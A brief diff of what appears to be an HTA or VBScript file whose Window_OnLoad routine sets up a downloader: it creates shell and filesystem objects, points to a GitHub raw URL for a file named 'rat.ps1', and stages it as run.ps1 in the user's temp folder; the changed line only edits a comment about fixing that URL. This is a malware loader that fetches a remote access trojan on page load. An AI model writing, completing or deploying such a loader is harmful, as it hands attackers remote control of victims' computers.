@@ -11,7 +11,7 @@ Sub Window_OnLoad
     Set shell = CreateObject("WScript.Shell")
     Set fso = CreateObject("Scripting.FileSystemObject")
     
-    ' CORRECTED URL - no extra quote
+    ' FIXED URL - no extra quote, correct path
     psURL = "https://raw.githubusercontent.com/Skibidi101201/rat/main/rat.ps1"
     
     psPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\run.ps1"
